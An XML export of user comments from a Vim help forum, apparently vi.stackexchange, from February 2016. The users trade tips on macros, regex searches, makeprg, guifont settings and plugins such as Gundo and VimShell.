  <row Id="10350" PostId="6512" Score="0" Text="Why don't you try [the issue](https://github.com/tpope/vim-markdown/issues) [trackers](https://github.com/neovim/neovim/issues)?" CreationDate="2016-02-16T15:55:12.967" UserId="1405" />
  <row Id="10351" PostId="6512" Score="0" Text="In this case, I am not sure if it is `neovim` or `vim-markdown` question." CreationDate="2016-02-16T16:03:59.587" UserId="3050" />
  <row Id="10352" PostId="6516" Score="0" Text="OK, that works..." CreationDate="2016-02-16T16:28:31.383" UserId="3050" />
  <row Id="10353" PostId="6500" Score="1" Text="This is normally controlled not by which operator is used, but by defining the motion as linewise or not. You want to avoid writing to specific operators so that your text object can with nicely with custom operators as well." CreationDate="2016-02-16T16:47:29.360" UserId="64" />
  <row Id="10354" PostId="6511" Score="0" Text="@fruglemonkey: Thank you so much....That's what all i needed...you rocks!!!!" CreationDate="2016-02-16T17:17:52.447" UserId="5912" />
  <row Id="10356" PostId="6511" Score="1" Text="Related post: [Is it possible to grep Vimʼs quickfix?](http://stackoverflow.com/q/15406138/438329)" CreationDate="2016-02-16T18:03:26.357" UserId="778" />
  <row Id="10357" PostId="6509" Score="0" Text="If I understood it right, this will have to be done each time OP switches to something with a different root directory, i.e, there's no way to evaluate what the root directory is when `:make` is called." CreationDate="2016-02-16T18:13:10.840" UserId="205" />
  <row Id="10358" PostId="6518" Score="0" Text="Thanks! The `v:operator` variable was just what I was looking for!" CreationDate="2016-02-16T18:28:55.467" UserId="21" />
  <row Id="10359" PostId="6500" Score="0" Text="The entire point is that I want the motion to be linewise in some cases, but not in other cases, depending on which operator is used. I understand that this may seem inconsistent, but in this particular case, I think such a differentiation is natural." CreationDate="2016-02-16T18:32:15.740" UserId="21" />
  <row Id="10360" PostId="6511" Score="0" Text="@Peter: Excellent resource...thanks!!" CreationDate="2016-02-16T19:00:14.410" UserId="5912" />
  <row Id="10361" PostId="6501" Score="0" Text="And if you have the input file loaded up in Vim, you can just do `:!java MyProgram %`. Further, you could change the `'makeprg'` for .in files also... `:let &amp;makeprg = 'java MyProgram %'`..." CreationDate="2016-02-16T19:22:30.113" UserId="6430" />
  <row Id="10362" PostId="6478" Score="0" Text="Not sure what to make of this. I am an Ubuntu user." CreationDate="2016-02-16T19:29:21.847" UserId="5919" />
  <row Id="10363" PostId="6449" Score="1" Text="XML syntax coloring should be installed by default anyway so you shouldn't need to download and link it separately." CreationDate="2016-02-16T19:50:55.957" UserId="6430" />
  <row Id="10364" PostId="6519" Score="0" Text="mMontu: must give it a try tomorrow....looks like what i really need...." CreationDate="2016-02-16T20:05:14.557" UserId="5912" />
  <row Id="10365" PostId="6486" Score="0" Text="Perl isn't in the operating system." CreationDate="2016-02-16T20:53:00.350" UserId="6430" />
  <row Id="10366" PostId="3998" Score="0" Text="I've never run into a circumstance where the mode/type of a register mattered but for those interested see `:help setreg()` for info on how to use these functions and what 'mode' means (getreg/setreg pairs are insufficient)." CreationDate="2016-02-16T21:05:29.280" UserId="6430" />
  <row Id="10367" PostId="6290" Score="0" Text="@mMontu Oh, okay. For some reason, I thought the person I was responding to would be notified. Thanks for telling me that." CreationDate="2016-02-16T23:16:23.197" UserId="6195" />
  <row Id="10368" PostId="6528" Score="1" Text="Awesome, I didn't know about the `g &lt;c-a&gt;` way. Thanks for sharing." CreationDate="2016-02-17T01:11:04.773" UserId="6337" />
  <row Id="10369" PostId="6501" Score="0" Text="If I'm in the shell and I have the files `MyProgram.java` and `MyProgram.class`, I can edit the java file in vim with `vim MyProgram.java` and run the compiled java program with `java MyProgram`. But if I write `:!java MyProgram abc.in`, it doesn't work. I guess I'm messing up what should be written in the console and what should be written in vim." CreationDate="2016-02-17T01:24:28.070" UserId="6433" />
  <row Id="10370" PostId="6501" Score="0" Text="Indeed, `:!java MyProgram abc.in` is a vim command. It is also sensitive to the current directory (check `:pwd`). There is no &quot;one true answer&quot; here, since all of it is very contextual, and you'd need to tweak according to your project structure and what exactly you are trying to achieve." CreationDate="2016-02-17T01:26:41.700" UserId="4729" />
  <row Id="10371" PostId="6509" Score="0" Text="@Luc Hermitte Thank you very much. let &amp;makeprg=FindRootDirectory().&quot;/app/Console/cake test %:p&quot; does work, but I'm also getting a black screen instead of my previous opened file. Do you know how can I get only results in the bottom? I attach screenshot and update my question. Thank you." CreationDate="2016-02-17T02:00:13.320" UserId="3302" />
  <row Id="10372" PostId="6526" Score="2" Text="It worked! Very nice, thank you. I had a problem initially with the Ctrl-a highlighting everything instead of adding, because I'm using gVim in Windows... but I did a quick search and found this thread - http://stackoverflow.com/questions/289681/why-does-c-a-ctrla-not-work-under-gvim-on-windows - where I used the suggestion of putting&#xA;&#xA;    nnoremap &lt;kPlus&gt; &lt;C-a&gt;&#xA;    nnoremap &lt;kMinus&gt; &lt;C-x&gt;&#xA;&#xA;in the _vimrc so that I can use the &quot;+&quot; and &quot;-&quot; keys for adding and subtracting.&#xA;&#xA;Also, the global command needed to be&#xA;&#xA;    :g//normal 11@a&#xA;&#xA;for me, but that was easily figured out. Thank you!" CreationDate="2016-02-17T02:01:55.383" UserId="6195" />
  <row Id="10373" PostId="6528" Score="1" Text="@fruglemonkey The first part of your answer is the same as the one above, but thank you nonetheless. The second part, I don't think works for me (unless I'm doing something wrong), so I must not be using the right version." CreationDate="2016-02-17T02:22:39.240" UserId="6195" />
  <row Id="10374" PostId="6527" Score="0" Text="I'm not sure if I'm doing something wrong, but it doesn't seem to be working. I followed what you wrote, but perhaps I misunderstood something or didn't execute something properly. (I'm getting the first number of the line incremented, not the last number of the line.) Thank you for replying." CreationDate="2016-02-17T02:36:36.463" UserId="6195" />
  <row Id="10375" PostId="6509" Score="0" Text="@muru I have tried with several projects and :silent! make | copen does work great." CreationDate="2016-02-17T02:36:42.520" UserId="3302" />
  <row Id="10376" PostId="6508" Score="0" Text="@romainl thank you. I read it, but didn't get it ^^" CreationDate="2016-02-17T02:45:09.060" UserId="3302" />
  <row Id="10377" PostId="6529" Score="2" Text="Wow, great one-line command. I remember that you also found an elegant one-line solution for the first question I asked a few weeks ago. Very nice work. Thank you very much. Also, I'm guessing there's a way to put this in the _vimrc file so that I can execute an easy-to-remember command or function without typing the entire line above (or having to scroll through the list of previous commands), but I'm not yet familiar enough with the _vimrc syntax to know how to do it." CreationDate="2016-02-17T02:51:38.507" UserId="6195" />
  <row Id="10378" PostId="6523" Score="1" Text="```&quot;It doesn't recognize Vundle&quot;``` can you explain further? Error messages, logs, etc?" CreationDate="2016-02-17T02:59:49.827" UserId="4932" />
  <row Id="10379" PostId="6519" Score="0" Text="It is a really cool script...thank you so much..." CreationDate="2016-02-17T07:04:41.933" UserId="5912" />
  <row Id="10380" PostId="6527" Score="3" Text="I think the first macro should be `qaVyp$b&lt;c-a&gt;`. Or better, just `qayyp$b&lt;c-a&gt;`." CreationDate="2016-02-17T07:08:28.050" UserId="21" />
  <row Id="10381" PostId="6527" Score="1" Text="Thanks, @KarlYngveLervåg, you're right, I fixed the macro." CreationDate="2016-02-17T08:10:15.113" UserId="6337" />
  <row Id="10383" PostId="6531" Score="4" Text="Not running Vim (or anything) as root is your best bet. Assuming `$EDITOR` is set to `vim`, simply use `$ sudo -e filename`." CreationDate="2016-02-17T08:33:03.140" UserId="54" />
  <row Id="10385" PostId="6527" Score="0" Text="It still doesn't seem to be working for me. After hitting the &quot;b&quot; in `qayyp$b&lt;c-a&gt;` it does not go to the last &quot;1&quot;, it goes to two characters _after_ the last &quot;1&quot;... so then when I hit &lt;c-a&gt; (the &quot;+&quot; sign for me) nothing happens (except a beep). I already have the solution, but I just wanted to mention this for the sake of academics. Thanks for trying." CreationDate="2016-02-17T08:49:58.667" UserId="6195" />
  <row Id="10386" PostId="6509" Score="0" Text="Looks like you need to source the plugin where this function is defined before calling it." CreationDate="2016-02-17T08:55:08.797" UserId="626" />
  <row Id="10387" PostId="6527" Score="2" Text="Argh :( thanks for being thorough @ablewasiereisawelba. I guess the macro `qqyyp$?\d&lt;CR&gt;&lt;Ctrl-a&gt;q` by @fruglemonkey and @jjaderberg is better since it searches the last number. I'll change it for completeness." CreationDate="2016-02-17T09:00:35.087" UserId="6337" />
  <row Id="10388" PostId="6449" Score="0" Text="have reinstalled vim, but still no colors. More details in question body UPD" CreationDate="2016-02-17T09:21:54.843" UserId="6399" />
  <row Id="10389" PostId="6449" Score="2" Text="Have you tried ```:syntax enable```?" CreationDate="2016-02-17T09:31:57.443" UserId="4932" />
  <row Id="10390" PostId="6530" Score="4" Text="How about installing Rhysd's `vim-clang-format` plugin, together with its requirements (especially `vim-operator-user`), and then map `=` to `&lt;Plug&gt;(operator-clang-format)`? Plugin link: https://github.com/rhysd/vim-clang-format" CreationDate="2016-02-17T09:49:48.247" UserId="1800" />
  <row Id="10391" PostId="6527" Score="2" Text="@kba I just thought that if anyone takes the time and effort to answer my question, I could at least try his solution - even if I had already found a working solution from someone else. I appreciate your effort - and if it makes you feel any better, you're still miles ahead of me. :)" CreationDate="2016-02-17T10:08:08.323" UserId="6195" />
  <row Id="10392" PostId="6459" Score="2" Text="@romainl That states: &quot;the second character [determines] the type of brace found&quot; which implies that `]` should always match a `}`. This, as the OP points out, is not the case. They're asking for clarification on this point, not for the definition of a section." CreationDate="2016-02-17T10:24:44.297" UserId="343" />
  <row Id="10393" PostId="6530" Score="0" Text="Thank you @VanLaser Do you also know how to make it work with the motion: `==` for one line and `gg=G` for the whole buffer?" CreationDate="2016-02-17T10:32:21.187" UserId="1542" />
  <row Id="10394" PostId="6524" Score="0" Text="This did not work for me. I got the blurry icons, but clicking these makes the screen refresh without doing anything. I still have to change the font size manually." CreationDate="2016-02-17T11:34:16.763" UserId="5919" />
  <row Id="10395" PostId="6531" Score="1" Text="Just in case you are running Vim as root (which you should not but it can happen), I'd recommend to have only a very rudimentary vimrc in `/root/.vimrc`. I usually just turn syntax highlighting on. The fancier your normal user vim setup, the more obvious it will be that you are running as root." CreationDate="2016-02-17T11:52:15.300" UserId="6337" />
  <row Id="10396" PostId="6530" Score="0" Text="@VanLaser sorry for my reluctance - I was simply not believing: your comment works as expected. Make it an answer please." CreationDate="2016-02-17T11:54:03.340" UserId="1542" />
  <row Id="10397" PostId="6535" Score="5" Text="Can't you just use a macro? `qqf&quot;d$j`" CreationDate="2016-02-17T12:31:22.737" UserId="4932" />
  <row Id="10398" PostId="6533" Score="2" Text="Your question reminded me of: https://www.youtube.com/watch?v=gd3oYFS9g9I :D" CreationDate="2016-02-17T12:39:12.393" UserId="1800" />
  <row Id="10399" PostId="6524" Score="0" Text="Try `:echo substitute(&amp;guifont, '\(\d\+\)', '\=submatch(1)-1', '')` what does that give you" CreationDate="2016-02-17T12:48:56.227" UserId="71" />
  <row Id="10400" PostId="6523" Score="0" Text="Have you looked at this [issue](https://github.com/Valloric/YouCompleteMe/issues/1894) ?" CreationDate="2016-02-17T13:58:31.517" UserId="1453" />
  <row Id="10401" PostId="6534" Score="3" Text="(Under linux/unix) You can make this less of a mouthful by aliasing it (eg in your bash profile) ... **alias virvim=&quot;vim -u NONE -U NONE -N -i NONE&quot;** then you can just use virvim from then on :)" CreationDate="2016-02-17T14:45:13.157" UserId="6461" />
  <row Id="10402" PostId="6541" Score="5" Text="Might be a font thing. Which font are you using?" CreationDate="2016-02-17T16:47:08.083" UserId="205" />
  <row Id="10404" PostId="6524" Score="0" Text="Nothing happens. Not sure there was even a refresh." CreationDate="2016-02-17T17:55:11.097" UserId="5919" />
  <row Id="10405" PostId="6541" Score="1" Text="7 fonts (consolas, 2 courier,2 lucida, fixedsys, and terminal) are listed in gvim. I tried all of them. While my system has other fonts too, but gvim displays only 7. I Also followed: http://stackoverflow.com/questions/3766204/vim-doesnt-support-unicode but still no luck." CreationDate="2016-02-17T18:40:58.167" UserId="6462" />
  <row Id="10406" PostId="6524" Score="0" Text="You should see an output. What is your guifont setting?" CreationDate="2016-02-17T19:24:24.697" UserId="71" />
  <row Id="10407" PostId="6524" Score="0" Text="Oops, now I get it: `Monospace 20`, the command above prints `Monospace 19`" CreationDate="2016-02-17T19:44:30.650" UserId="5919" />
  <row Id="10408" PostId="6524" Score="2" Text="that looks correct. And if you run this command: `:let &amp;guifont=substitute(&amp;guifont, '\(\d\+\)', '\=submatch(1)-1', '')` Does that decrease your font size?" CreationDate="2016-02-17T19:55:04.100" UserId="71" />
  <row Id="10409" PostId="6543" Score="1" Text="And somehow you thought it was a good idea to ask about that here instead of on [the issue tracker](https://github.com/jistr/vim-nerdtree-tabs/issues)…" CreationDate="2016-02-17T19:58:02.537" UserId="54" />
  <row Id="10410" PostId="6527" Score="0" Text="You cannot run a macro inside another macro, can you?" CreationDate="2016-02-17T20:29:12.943" UserId="599" />
  <row Id="10411" PostId="6543" Score="0" Text="Shrinking? It must be a sign .. :)" CreationDate="2016-02-17T20:51:47.003" UserId="1800" />
  <row Id="10412" PostId="6544" Score="1" Text="[@fruglemonkey proposed that as well](http://vi.stackexchange.com/a/6528/6337). It's a cool feature, though it's fairly recent (by vim standards), since 7.4.754 which hasn't shipped to all distros yet." CreationDate="2016-02-17T21:22:24.220" UserId="6337" />
  <row Id="10413" PostId="6527" Score="0" Text="@Vitor yes you can. [`qa@bqqb@aq`](https://en.wikipedia.org/wiki/Turtles_all_the_way_down) ;)" CreationDate="2016-02-17T21:25:20.950" UserId="6337" />
  <row Id="10414" PostId="6544" Score="0" Text="Missed it sorry" CreationDate="2016-02-17T21:48:09.740" UserId="599" />
  <row Id="10415" PostId="6545" Score="2" Text="Check the `:h guioptions` setting, adding `c` may do what you want (`set guioptions+=c`). If it works, `Enter` accepts, `Esc` cancels, `Backspace` deletes (if you have a default value and want to change it)." CreationDate="2016-02-17T22:03:02.237" UserId="1800" />
  <row Id="10416" PostId="6545" Score="1" Text="@VanLaser thanks, it is exactly what I want. I completely forgot to look at `guioptions`. Care to add as an answer ?" CreationDate="2016-02-17T22:08:23.850" UserId="1453" />
  <row Id="10417" PostId="6547" Score="1" Text="Try running the plugin by itself without any other plugins. Does it still throw an error?" CreationDate="2016-02-18T01:04:18.067" UserId="4932" />
  <row Id="10419" PostId="6547" Score="2" Text="It's an alpha release. You should report that to the author. He can fix that pretty easily, I guess" CreationDate="2016-02-18T06:37:32.353" UserId="71" />
  <row Id="10420" PostId="6499" Score="0" Text="That contradicts the official german spelling rules, besides, even Grimms dictionary won't adhere to the official rules anymore, since it is too old. The rule is, to uppercase write German nounds. Period." CreationDate="2016-02-18T06:39:26.127" UserId="71" />
  <row Id="10421" PostId="6464" Score="0" Text="Check the syn rules for your tex file." CreationDate="2016-02-18T06:47:21.640" UserId="71" />
  <row Id="10422" PostId="6543" Score="0" Text="Good point, I guess i should've though of that." CreationDate="2016-02-18T07:18:50.383" UserId="6468" />
  <row Id="10423" PostId="5315" Score="0" Text="@Wildcard Good idea, I did not think of this!" CreationDate="2016-02-18T09:19:32.043" UserId="1296" />
  <row Id="10424" PostId="6531" Score="0" Text="@romainl: thanks for your kind suggestion...i hope this is the most reasonable thing the new vim users should follow..." CreationDate="2016-02-18T09:41:16.477" UserId="5912" />
  <row Id="10425" PostId="6531" Score="0" Text="@kba: thanks for your kind opinion...it is also a very good option to try..." CreationDate="2016-02-18T09:41:49.263" UserId="5912" />
  <row Id="10426" PostId="6539" Score="0" Text="Thanks for your help...the answer is quite helpful...while in Linux, it  is undoubtedly a brilliant idea. What I believe now, is without understanding the code it is simply not to use that at all...or at least for those `unknown` or `lesser known` scripts..." CreationDate="2016-02-18T09:48:50.810" UserId="5912" />
  <row Id="10427" PostId="6547" Score="0" Text="@ChristianBrabandt - tried also the earlier release from 5 years ago (prior to alpha) and exact same error comes up." CreationDate="2016-02-18T10:27:39.997" UserId="6473" />
  <row Id="10428" PostId="6555" Score="3" Text="+1 for Ultisnips. You can also specify jump locations and default locations for your cursor after expanding a snippet." CreationDate="2016-02-18T10:33:13.593" UserId="4932" />
  <row Id="10431" PostId="6539" Score="0" Text="@mMontu: excellent info...why not you post this as an answer...i believe that much info, is at least give basic idea for a newbies to look out in the the unknown sources...thank you so much...you rock!!!" CreationDate="2016-02-18T11:24:36.863" UserId="5912" />
  <row Id="10432" PostId="6539" Score="0" Text="@Cylian good idea, thanks for being so kind." CreationDate="2016-02-18T11:38:48.493" UserId="1405" />
  <row Id="10433" PostId="6557" Score="0" Text="+1, nice sets of basic info on the specific topic...really helpful...thanks!" CreationDate="2016-02-18T12:49:13.860" UserId="5912" />
  <row Id="10434" PostId="6544" Score="1" Text="@Vitor I just have gVim 7.4 so I don't think I can do the `g&lt;C-a&gt;` that @fruglemonkey and you referred to, but thanks for responding. I should note that when trying your macro - just before I get to the `g&lt;C-a&gt;` part, it isn't the last &quot;1&quot; character that I'm looking to increment that gets block-highlighted, but instead it's the character before the first &quot;1&quot; character that gets block-highlighted. (Also, I think it would have be `yy11p` and `10j` in the macro, since I'm looking to _add_ 11 lines - for a total of 12.)" CreationDate="2016-02-18T13:36:37.720" UserId="6195" />
  <row Id="10435" PostId="6547" Score="0" Text="@fruglemonkey - disabling all other plugins is not helping and error persisting." CreationDate="2016-02-18T13:41:58.950" UserId="6473" />
  <row Id="10436" PostId="6558" Score="1" Text="Do you mean that Gundo doesn't work with your Python version? I believe it requires _at least_ Python 2.4, but should work with any Python 2.4+. Seems to be working with `2.7.6` in my machine." CreationDate="2016-02-18T14:36:20.470" UserId="2329" />
  <row Id="10437" PostId="6558" Score="0" Text="It does indeed say that it requires 2.4+ but it still doesn't make sense." CreationDate="2016-02-18T15:02:30.580" UserId="5346" />
  <row Id="10438" PostId="6558" Score="0" Text="How so? If it doesn't work and displays this message as an error explanation, then there's something wrong with your setup (Gundo doesn't communicate properly with Python, or at least not with this specific implementation you installed). If it works, it's just an information that you can't use Gundo with Python older than 2.4 (which is _very_ old itself). Where exactly is this Python version requirement displayed?" CreationDate="2016-02-18T15:06:25.570" UserId="2329" />
  <row Id="10439" PostId="6558" Score="0" Text="What is your Vim version? Please show `:version` output" CreationDate="2016-02-18T15:18:42.123" UserId="71" />
  <row Id="10441" PostId="6558" Score="0" Text="The python error message is  displayed after I have used the F5-key to start gundo. That is why I have posted my .vimrc plugin." CreationDate="2016-02-18T16:35:05.320" UserId="5346" />
  <row Id="10443" PostId="6561" Score="6" Text="If it's just the lines with more than one comma, you could search `/,.*,/`" CreationDate="2016-02-18T16:59:52.227" UserId="6337" />
  <row Id="10444" PostId="6562" Score="0" Text="The second one worked perfect for my needs. Thank you for the help!" CreationDate="2016-02-18T17:05:08.983" UserId="1417" />
  <row Id="10445" PostId="6563" Score="2" Text="Well, there's nothing like regex to make me feel like I'm over-complicating everything. :(" CreationDate="2016-02-18T17:11:18.793" UserId="72" />
  <row Id="10448" PostId="6558" Score="0" Text="After pressing F5, I get this message: &quot;E117: Unknown function: gundo#GundoToggle.&quot; After pressing F5 again, I get the message: &quot;Gundo requires Vim to be compiled with Python 2.4+ &quot;" CreationDate="2016-02-18T17:53:23.307" UserId="5346" />
  <row Id="10449" PostId="6563" Score="6" Text="@JoshPetrie While we are complicating... `/,.*,`" CreationDate="2016-02-18T19:08:02.983" UserId="205" />
  <row Id="10452" PostId="6558" Score="5" Text="You have **-python** You need a Vim with **+python** or **+python/dyn**. Try installing vim-gtk from your package manager." CreationDate="2016-02-18T20:34:19.423" UserId="71" />
  <row Id="10453" PostId="6558" Score="0" Text="That did  the job. Thanks for your patience and your answer, Christian Brabandt." CreationDate="2016-02-18T20:40:18.267" UserId="5346" />
  <row Id="10454" PostId="6556" Score="0" Text="Rainbow Parenthesis doesn't quite make it obvious enough which paren is being matched (although I'll try it anyway); Limp seems a bit heavy for this purpose (I already use language-agnostic scripts like ConqueTerm, Syntastic, etc. for IDE-like features)." CreationDate="2016-02-18T23:52:03.360" UserId="6476" />
  <row Id="10455" PostId="6565" Score="0" Text="Why a plugin? Your answer is in `:help highlight-groups`." CreationDate="2016-02-19T06:20:59.790" UserId="54" />
  <row Id="10456" PostId="6563" Score="0" Text="@muru I think it is convenient to include the starting `/^.*`, in order to match only once per line (cf. the original question)." CreationDate="2016-02-19T06:50:22.383" UserId="21" />
  <row Id="10457" PostId="6563" Score="1" Text="@KarlYngveLervåg because of greedy matching, I'd think it would match only once per line anyway." CreationDate="2016-02-19T06:53:14.137" UserId="205" />
  <row Id="10458" PostId="6563" Score="0" Text="Ah, yes, you are right! I've updated the answer accordingly. Thanks!" CreationDate="2016-02-19T07:10:54.577" UserId="21" />
  <row Id="10459" PostId="6570" Score="0" Text="Thank you very much. It works perfectly." CreationDate="2016-02-19T08:15:12.957" UserId="3302" />
  <row Id="10460" PostId="6570" Score="1" Text="Interesting, +1. I was thinking using RE but discovered that's not possible: http://stackoverflow.com/questions/5139300/match-parenthesised-block-using-regular-expressions-in-vim" CreationDate="2016-02-19T09:42:50.163" UserId="854" />
  <row Id="10461" PostId="6570" Score="0" Text="+1 also. Just a minor possible improvement, if Vim is recent enough to support the `gn` object, you could replace `de` with `dgn` to delete the next occurrence of the last searched pattern. You could still check each substitution, but you wouldn't have to hit `n` before replaying the macro with `@q`." CreationDate="2016-02-19T10:05:41.227" UserId="4939" />
  <row Id="10462" PostId="6570" Score="3" Text="Interesting suggestion, thanks. I'll just leave it like that anyways, because using  n + @q has the advantage of possibly highlighting the match, which might make the whole process go down easier. Just so many possibilities..." CreationDate="2016-02-19T10:08:35.813" UserId="1296" />
  <row Id="10463" PostId="6570" Score="1" Text="Yes you're right, `gn` is probably not really useful here, because the searched pattern is well-defined and not a regex whose length may vary. Plus I didn't think you could simply add the `n` motion inside the macro, your approach adds the benefit of really seeing what's going on at each step of the process." CreationDate="2016-02-19T10:25:06.760" UserId="4939" />
  <row Id="10464" PostId="6570" Score="1" Text="The other good thing of adding the search to the macro could be the possibility to apply it to the whole buffer with `:% normal @a`... yes, a lot of possibilities." CreationDate="2016-02-19T10:25:11.667" UserId="854" />
  <row Id="10465" PostId="6544" Score="1" Text="Thanks for your feedback. I've updated the answer accordingly. Decided to use `\zs`, but I could just as well simply have added a `l` after `&lt;CR&gt;`." CreationDate="2016-02-19T11:41:33.630" UserId="599" />
  <row Id="10466" PostId="6574" Score="1" Text="`GitLocations` won't work as expected, since you'll be calling Vim's `:find`, not the `find` command. Might try something like `return system('find $HOME ...')` (and add a `-type d` to it to skip submodules, perhaps?)" CreationDate="2016-02-19T16:19:05.987" UserId="205" />
  <row Id="10467" PostId="6574" Score="0" Text="Good idea. With that, all I need is a way to bind `s:msg` to the contents of the line range (within `CommitTextGitRepo` above)." CreationDate="2016-02-19T16:27:01.207" UserId="6499" />
  <row Id="10468" PostId="6574" Score="1" Text="Maybe you could use `getline()` and `join()` like this: `let s:msg = join(getline(a:l1,a:l2), &quot;\n&quot;)`" CreationDate="2016-02-19T16:36:53.540" UserId="4939" />
  <row Id="10470" PostId="6574" Score="0" Text="@saginaw: That approach worked to get s:msg." CreationDate="2016-02-19T17:09:52.373" UserId="6499" />
  <row Id="10472" PostId="6575" Score="2" Text="`-printf` isn't available in my OSX version of find but you can get something similar using internal Vim functions anyway: `return fnamemodify(finddir('.git', $HOME), &quot;:h&quot;)`. I always work with my current directory inside the repo though so it's even easier since I don't need to get the git dir, I could just use `let l:rootdir = fnamemodify(finddir('.git', getcwd().';/'), &quot;:h&quot;)` directly in the commit function (this uses upward as opposed to downward searching because of the semicolon)." CreationDate="2016-02-19T17:28:49.823" UserId="6430" />
  <row Id="10473" PostId="6575" Score="2" Text="@dash-tom-bang ah, well, if you're already in the required git repo, you can run `git commit` directly. :) Even so, the pure Vimscript way might be more efficient than calling `system('find ...')`, so that's something OP should look into. I assume OP is using GNU `find`, since they came up with that part themselves." CreationDate="2016-02-19T17:39:47.817" UserId="205" />
  <row Id="10474" PostId="6577" Score="2" Text="I suppose the expression register executes the function which appends some text, but it also stores the code returned by `append()` when everything went fine, which is `0`. It would explain why it inserts `1` instead of `0` when `append()` fails because you gave it a line number which exceeds the maximum number of lines in the buffer." CreationDate="2016-02-20T00:21:03.913" UserId="4939" />
  <row Id="10475" PostId="6577" Score="1" Text="I also suppose that both information get returned through a list with 2 items, code returned in the first, evaluation/execution of the function in the second. So if you only wanted the evaluation/execution of the function, you could try: `&lt;c-r&gt;=append(line('.'), readfile('foo.txt'))[1]`" CreationDate="2016-02-20T00:21:06.820" UserId="4939" />
  <row Id="10476" PostId="6577" Score="0" Text="@saginaw That's it. :/ `&lt;c-r&gt;=` inserts whatever the expression returned, which would be `0`/`1` here. That `append` inserts text is a side-effect. I feel very dumb." CreationDate="2016-02-20T00:26:44.303" UserId="205" />
  <row Id="10477" PostId="6577" Score="0" Text="I found your question interesting, it made me learn 2 things: you can use the expression register to execute vimscript code (I wouldn't have thought about that, I thought you could only evaluate an expression), and when a function performs some action and returns a code, both information seem to be sent through a common list." CreationDate="2016-02-20T00:32:05.250" UserId="4939" />
  <row Id="10478" PostId="6577" Score="2" Text="@saginaw No, I don't think there's a list involved here. I think it's like this: `&lt;c-r&gt;=append(..)` calls `append`, `append` adds some text wherever it's told to, returns 0 or 1 as appropriate, and then `&lt;c-r&gt;=` inserts the return value." CreationDate="2016-02-20T00:37:43.390" UserId="205" />
  <row Id="10479" PostId="6577" Score="1" Text="Ah you're right. `&lt;c-r&gt;=append(line('.'), readfile('foo.txt'))[0]` inserts both the code and the contents of `foo.txt`, while `&lt;c-r&gt;=append(line('.'), readfile('foo.txt'))[whatever number]` inserts only `foo.txt`." CreationDate="2016-02-20T00:43:09.883" UserId="4939" />
  <row Id="10480" PostId="6577" Score="1" Text="It's interesting that we don't get an invalid index error with that. I wonder why." CreationDate="2016-02-20T00:46:44.793" UserId="205" />
  <row Id="10481" PostId="6577" Score="1" Text="I think I know. The code returned by `append()` is a number. When you add `[1]` behind this number, Vim automatically coerces the number into a string. So `:echo append(...)[1]` is the same as `:echo &quot;0&quot;[1]`, which is the second character in the string `&quot;0&quot;`, but there's no second character, so you get an empty string." CreationDate="2016-02-20T00:58:09.613" UserId="4939" />
  <row Id="10482" PostId="6577" Score="2" Text="`:echo type(append(line('.'), readfile('foo.txt')[1]))` returns `1` which is the code for a string and seems to show that Vim automatically transforms `0[1]` into `&quot;0&quot;[1]`. And when you give an index which is beyond the length of a string, Vim doesn't raise an error but simply returns an empty string. `:h expr-[:]`: `If an index goes out of range for the string characters are omitted.`" CreationDate="2016-02-20T01:27:27.113" UserId="4939" />
  <row Id="10483" PostId="6192" Score="0" Text="Finally got around to trying this. Works great! So much for all the naysayers that claimed it couldn't be done. As described in this answer, this works even better than the Neovim terminal emulator, which was supposed be better because it is built in. Neovim does not allow jumping around in normal mode on the current line and then editing it from there, but VimShell does! The terminal in Neovim is kind of ridiculous. When you go into normal mode, the cursor jumps to the bottom of the screen! Also, when you use gf from the terminal output to try to jump to a file, it looks in the wrong place." CreationDate="2016-02-20T01:49:48.300" UserId="1410" />
  <row Id="10485" PostId="2634" Score="0" Text="@romainl Actually VimShell is a &quot;real&quot; shell. It is a complete shell written in VimScript. It also does what I was asking about. I can't say if I recommend it or not as I have just started using it." CreationDate="2016-02-20T02:45:24.270" UserId="1410" />
  <row Id="10486" PostId="6192" Score="0" Text="As a side note, from reading through some of the documentation, it becomes clear that VimShell is a complete shell, implemented in Vimscript. It is not a wrapper around another shell. It even works under Windows, somewhat, not that I want to use Windows... It does not read in your .bashrc or .zshrc because it has nothing to do with bash or zsh. It has its own configuration file, .vimshrc." CreationDate="2016-02-20T02:57:45.287" UserId="1410" />
  <row Id="10487" PostId="6192" Score="0" Text="Also just a side note, but the more I look into VimShell, the more promising it looks. It has been under active development by the main developer since 2009, and continues to have regular commits. Seems as if they recently added Neovim support, which is very good since some people may want to use plugins designed exclusively for Neovim, but prefer VimShell over Neovim's terminal emulator." CreationDate="2016-02-20T03:07:58.403" UserId="1410" />
  <row Id="10488" PostId="6544" Score="0" Text="Thanks for your update. It's better, but now it's block-highlighting the first &quot;1&quot; character in the eleven newly created lines - after the `10j`, just before I get to the `g&lt;C-a&gt;` part. As I noted previously and stated in my original question, the &quot;1&quot; that I want to increment from &quot;2&quot; to &quot;12&quot; is the _last_ &quot;1&quot; character, not the first one." CreationDate="2016-02-20T07:05:05.857" UserId="6195" />
  <row Id="10489" PostId="6581" Score="1" Text="OP says &quot;up until the next occurrence of `/`&quot;, so use non-greedy matching or `[^/]*` instead of `.*`." CreationDate="2016-02-20T10:02:08.767" UserId="205" />
  <row Id="10490" PostId="6581" Score="0" Text="Indeed, duly noted :)" CreationDate="2016-02-20T10:05:58.217" UserId="1800" />
  <row Id="10491" PostId="6581" Score="0" Text="I found that @VanLaser 's initial solution had deleted the `/` as well, but his edited answer now works like I want it to. Thanks for the answer and explanation." CreationDate="2016-02-20T10:09:59.283" UserId="6195" />
  <row Id="10492" PostId="6581" Score="0" Text="Yes, I often find myself going for the solution when I got the main part, but not all the details." CreationDate="2016-02-20T10:12:04.353" UserId="1800" />
  <row Id="10493" PostId="6582" Score="5" Text="You don't ... You go back one word, and change forward from there: `ge2caw` (also `b` or `2b` instead of `ge`, depending on which `c` the cursor initially is - `ge` is safer)." CreationDate="2016-02-20T10:20:08.950" UserId="1800" />
  <row Id="10494" PostId="6581" Score="0" Text="Oh, I didn't notice the part about &quot;greedy&quot; versus &quot;non-greedy&quot;, because in my file, the next `/` is always the last `/` in each line. When I realized what that was referring to, I put an extra `/` at the end of the first line just to test it out, and saw that it was deleting everything up to the end of the line. Also, replacing `.*` with `.*\{-}` doesn't seem to work for either solution." CreationDate="2016-02-20T10:21:04.110" UserId="6195" />
  <row Id="10495" PostId="6583" Score="0" Text="I also opened an issue on the YouCompleteMe project: https://github.com/Valloric/YouCompleteMe/issues/1997" CreationDate="2016-02-20T10:30:04.480" UserId="6514" />
